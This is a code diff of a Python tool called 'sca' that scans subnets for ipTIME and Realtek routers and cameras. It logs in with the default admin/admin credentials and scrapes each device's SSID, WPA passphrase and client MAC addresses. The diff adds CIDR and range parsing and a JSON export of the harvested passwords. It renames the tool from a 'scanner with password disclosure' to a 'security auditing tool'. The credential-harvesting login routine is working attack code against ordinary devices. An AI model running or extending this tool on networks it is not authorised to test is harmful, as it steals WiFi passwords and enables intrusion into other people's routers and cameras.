@@ -33,6 +33,7 @@ import argparse
 import base64
 import html
 import json
+import os
 import re
 import socket
 import subprocess
@@ -41,6 +42,8 @@ import threading
 import time
 import unicodedata
 from concurrent.futures import ThreadPoolExecutor
+
+__version__ = "1.1.0"
 
 try:
     from wcwidth import wcswidth as _wcswidth
@@ -603,63 +606,70 @@ def fetch_iptime_login(ip):
     """ipTIME: POST the login form with admin/admin, then read settings."""
     base = "http://%s" % ip
     jar = "/tmp/sca_iptime_%s.jar" % ip.replace(".", "_")
-    common = [
-        "curl", "-s", "--connect-timeout", "1.2", "--max-time", "7.0",
-        "-c", jar, "-b", jar,
-    ]
+    try:
+        common = [
+            "curl", "-s", "--connect-timeout", "1.2", "--max-time", "7.0",
+            "-c", jar, "-b", jar,
+        ]
 
-    run_curl(common + ["%s/sess-bin/login_session.cgi" % base])
-    run_curl(common + [
-        "-H", "Content-Type: application/x-www-form-urlencoded",
-        "-H", "Referer: %s/sess-bin/login_session.cgi" % base,
-        "--data", ("init_status=1&captcha_on=0&captcha_file="
-                   "&username=admin&passwd=admin"),
-        "%s/sess-bin/login_handler.cgi" % base,
-    ])
+        run_curl(common + ["%s/sess-bin/login_session.cgi" % base])
+        run_curl(common + [
+            "-H", "Content-Type: application/x-www-form-urlencoded",
+            "-H", "Referer: %s/sess-bin/login_session.cgi" % base,
+            "--data", ("init_status=1&captcha_on=0&captcha_file="
+                       "&username=admin&passwd=admin"),
+            "%s/sess-bin/login_handler.cgi" % base,
+        ])
 
-    menu = run_curl(common + [
-        "%s/sess-bin/timepro.cgi?tmenu=menu" % base])
-    if not menu or "login_session.cgi" in menu:
-        return None
+        menu = run_curl(common + [
+            "%s/sess-bin/timepro.cgi?tmenu=menu" % base])
+        if not menu or "login_session.cgi" in menu:
+            return None
 
-    pages = []
-    for url in ("%s/sess-bin/timepro.cgi?tmenu=wlan&smenu=wlan_basic" % base,
-                "%s/sess-bin/timepro.cgi?tmenu=wlan&smenu=wlan_security" % base,
-                "%s/sess-bin/timepro.cgi?tmenu=wlan&smenu=wlan_station" % base,
-                "%s/sess-bin/timepro.cgi?tmenu=status&smenu=wlan_station" % base):
-        pages.append(run_curl(common + [url]))
+        pages = []
+        for url in ("%s/sess-bin/timepro.cgi?tmenu=wlan&smenu=wlan_basic" % base,
+                    "%s/sess-bin/timepro.cgi?tmenu=wlan&smenu=wlan_security" % base,
+                    "%s/sess-bin/timepro.cgi?tmenu=wlan&smenu=wlan_station" % base,
+                    "%s/sess-bin/timepro.cgi?tmenu=status&smenu=wlan_station" % base):
+            pages.append(run_curl(common + [url]))
 
-    text = "\n".join(pages)
-    ssid = None
-    for name in ("ssid", "wlan_ssid", "essid"):
-        m = (re.search(r'name=["\']?%s["\']?[^>]*value=["\']([^"\']*)'
-                       % name, text, re.I)
-             or re.search(r'value=["\']([^"\']*)["\'][^>]*name=["\']?%s'
-                          % name, text, re.I))
-        if m and clean(m.group(1)):
-            ssid = clean(m.group(1))
-            break
-    if not ssid:
-        m = re.search(r"<title>(.*?)</title>", menu, re.I)
-        ssid = clean(m.group(1)) if m else None
-    if not ssid:
-        return None
+        text = "\n".join(pages)
+        ssid = None
+        for name in ("ssid", "wlan_ssid", "essid"):
+            m = (re.search(r'name=["\']?%s["\']?[^>]*value=["\']([^"\']*)'
+                           % name, text, re.I)
+                 or re.search(r'value=["\']([^"\']*)["\'][^>]*name=["\']?%s'
+                              % name, text, re.I))
+            if m and clean(m.group(1)):
+                ssid = clean(m.group(1))
+                break
+        if not ssid:
+            m = re.search(r"<title>(.*?)</title>", menu, re.I)
+            ssid = clean(m.group(1)) if m else None
+        if not ssid:
+            return None
 
-    pwd = None
-    for name in ("wpapsk", "wpa_psk", "wlan_psk", "psk", "passwd",
-                 "wpa_passphrase", "key"):
-        m = (re.search(r'name=["\']?%s["\']?[^>]*value=["\']([^"\']+)'
-                       % name, text, re.I)
-             or re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']?%s'
-                          % name, text, re.I))
-        if m and clean(m.group(1)):
-            pwd = clean(m.group(1))
-            break
+        pwd = None
+        for name in ("wpapsk", "wpa_psk", "wlan_psk", "psk", "passwd",
+                     "wpa_passphrase", "key"):
+            m = (re.search(r'name=["\']?%s["\']?[^>]*value=["\']([^"\']+)'
+                           % name, text, re.I)
+                 or re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']?%s'
+                              % name, text, re.I))
+            if m and clean(m.group(1)):
+                pwd = clean(m.group(1))
+                break
 
-    macs = set(re.findall(
-        r"([0-9A-Fa-f]{2}(?:[:-][0-9A-Fa-f]{2}){5})", text))
-    clients = len(macs) or None
-    return ssid, "0 / 0", False, pwd or "N/A", clients
+        macs = set(re.findall(
+            r"([0-9A-Fa-f]{2}(?:[:-][0-9A-Fa-f]{2}){5})", text))
+        clients = len(macs) or None
+        return ssid, "0 / 0", False, pwd or "N/A", clients
+    finally:
+        try:
+            if os.path.exists(jar):
+                os.remove(jar)
+        except OSError:
+            pass
 
 
 def try_login(ip, brand):
@@ -682,13 +692,60 @@ def try_login(ip, brand):
     return None
 
 
+def parse_target_args(target_arg, end_arg, subnet_arg):
+    """Parse flexible range, single IP, or CIDR notation into (subnet, start, end)."""
+    subnet = subnet_arg.strip(".") if subnet_arg else "15.15.15"
+    start, end = 175, 254
+
+    if target_arg:
+        target_str = str(target_arg).strip()
+        if "/" in target_str:
+            # CIDR notation: e.g. 192.168.1.0/24
+            ip_part = target_str.split("/")[0].strip()
+            parts = ip_part.split(".")
+            if len(parts) >= 3:
+                subnet = ".".join(parts[:3])
+                start, end = 1, 254
+        elif "-" in target_str and "." in target_str:
+            # Range notation: e.g. 192.168.1.10-50
+            prefix_part, end_part = target_str.rsplit("-", 1)
+            parts = prefix_part.split(".")
+            if len(parts) == 4 and end_part.isdigit():
+                subnet = ".".join(parts[:3])
+                start = int(parts[3])
+                end = int(end_part)
+        elif target_str.isdigit():
+            start = int(target_str)
+            if end_arg is not None:
+                end = int(end_arg)
+            else:
+                end = 254
+        elif "." in target_str:
+            # Explicit IP or 3-octet subnet: e.g. 192.168.1.50 or 192.168.1
+            parts = target_str.split(".")
+            if len(parts) == 4:
+                subnet = ".".join(parts[:3])
+                start = int(parts[3])
+                end = int(end_arg) if end_arg is not None else start
+            elif len(parts) == 3:
+                subnet = ".".join(parts[:3])
+                start, end = 1, 254
+    elif end_arg is not None:
+        end = int(end_arg)
+
+    start, end = min(start, end), max(start, end)
+    start = max(1, min(start, 254))
+    end = max(1, min(end, 254))
+    return subnet, start, end
+
+
 # --------------------------------------------------------------------------
 # One host
 # --------------------------------------------------------------------------
-def scan_target(ip, realtek_only=False):
+def scan_target(ip, realtek_only=False, alive_timeout=0.35, results=None):
     global counter, camera_count
 
-    if not is_host_alive(ip):
+    if not is_host_alive(ip, timeout=alive_timeout):
         return
 
     row = None
@@ -709,10 +766,10 @@ def scan_target(ip, realtek_only=False):
     if not row:
         return
 
-    ssid, traffic, is_cam, password, clients = row
+    raw_ssid, traffic, is_cam, password, clients = row
     status = "📷 Cameras" if is_cam else "❌ No Cameras"
-    clients = NO_CLIENTS if clients is None else clients
-    ssid = shape_arabic(ssid)
+    clients_disp = NO_CLIENTS if clients is None else clients
+    ssid = shape_arabic(raw_ssid)
 
     with print_lock:
         counter += 1
@@ -725,33 +782,63 @@ def scan_target(ip, realtek_only=False):
             pad(num, W_NUM) + " | "
             + pad(ip, W_IP) + " | "
             + pad(clip(ssid, W_SSID), W_SSID) + " | "
-            + pad(clients, W_CLIENTS) + " | "
+            + pad(clients_disp, W_CLIENTS) + " | "
             + pad(traffic, W_TRAF) + " | "
             + pad(password, W_PASS) + " | "
             + pad(status, W_STAT)
         )
         print(f"{RED}{line}{NC}" if is_cam else line, flush=True)
 
+        if results is not None:
+            results.append({
+                "id": counter,
+                "ip": ip,
+                "ssid": raw_ssid,
+                "clients": clients,
+                "traffic": traffic,
+                "password": None if password in ("N/A", LOGIN_REQ) else password,
+                "cameras_detected": is_cam,
+                "status": "Cameras" if is_cam else "No Cameras",
+            })
+
 
 # --------------------------------------------------------------------------
 def main():
     parser = argparse.ArgumentParser(
         prog="sca",
-        description="CPE camera/WiFi scanner with password disclosure",
+        description="High-speed CPE camera and router security auditing tool with credential disclosure analysis.",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  sca                           Scan default range (15.15.15.175 - 15.15.15.254)
+  sca 1 254                     Scan full subnet (15.15.15.1 - 15.15.15.254)
+  sca 1 254 -s 192.168.1        Scan 192.168.1.1 through 192.168.1.254
+  sca 192.168.1.0/24            Scan using CIDR notation
+  sca 192.168.1.100-200         Scan an explicit IP octet range
+  sca 192.168.1.1               Scan a single IP address
+  sca -t 32 -o scan.json        Scan with 32 threads and export output to JSON
+  sca --realtek-only            Audit Realtek CPE access points only
+        """,
     )
-    parser.add_argument("start", nargs="?", type=int, default=175)
-    parser.add_argument("end", nargs="?", type=int, default=254)
-    parser.add_argument("-t", "--threads", type=int, default=18)
-    parser.add_argument("-s", "--subnet", default="15.15.15")
+    parser.add_argument("target", nargs="?", default=None,
+                        help="Target range start octet (e.g. 175), CIDR (192.168.1.0/24), or range (192.168.1.1-254)")
+    parser.add_argument("end", nargs="?", type=int, default=None,
+                        help="Target range end octet (default: 254)")
+    parser.add_argument("-s", "--subnet", default="15.15.15",
+                        help="Target IPv4 subnet prefix (default: 15.15.15)")
+    parser.add_argument("-t", "--threads", type=int, default=18,
+                        help="Number of concurrent worker threads (default: 18)")
+    parser.add_argument("-T", "--timeout", type=float, default=0.35,
+                        help="Host alive probe timeout in seconds (default: 0.35)")
+    parser.add_argument("-o", "--output", default=None,
+                        help="Export scan results to a JSON file")
     parser.add_argument("--realtek-only", action="store_true",
-                        help="only Realtek devices")
+                        help="Restrict scanner heuristics to Realtek devices only")
+    parser.add_argument("-v", "--version", action="version",
+                        version=f"%(prog)s {__version__}")
     args = parser.parse_args()
 
-    subnet = args.subnet.strip(".")
-    start, end = min(args.start, args.end), max(args.start, args.end)
-    if start < 1 or end > 254:
-        parser.error("range must be inside 1..254")
-
+    subnet, start, end = parse_target_args(args.target, args.end, args.subnet)
     ip_list = [f"{subnet}.{i}" for i in range(start, end + 1)]
 
     header = (
@@ -764,10 +851,11 @@ def main():
     widths = (W_NUM, W_IP, W_SSID, W_CLIENTS, W_TRAF, W_PASS, W_STAT)
     print("-" * (sum(widths) + 3 * (len(widths) - 1)), flush=True)
 
+    results = [] if args.output else None
     executor = ThreadPoolExecutor(max_workers=max(1, args.threads))
     cancelled = False
     try:
-        futures = [executor.submit(scan_target, ip, args.realtek_only)
+        futures = [executor.submit(scan_target, ip, args.realtek_only, args.timeout, results)
                    for ip in ip_list]
         for f in futures:
             f.result()
@@ -781,6 +869,14 @@ def main():
 
     print(f"\n{CYAN}✔ Scan Completed — {counter} host(s), "
           f"{camera_count} camera(s){NC}", flush=True)
+
+    if args.output:
+        try:
+            with open(args.output, "w", encoding="utf-8") as f:
+                json.dump(results, f, indent=2, ensure_ascii=False)
+            print(f"{CYAN}✔ Saved {len(results)} record(s) to {args.output}{NC}", flush=True)
+        except Exception as e:
+            print(f"{RED}Error saving JSON output: {e}{NC}", file=sys.stderr)
 
 
 if __name__ == "__main__":
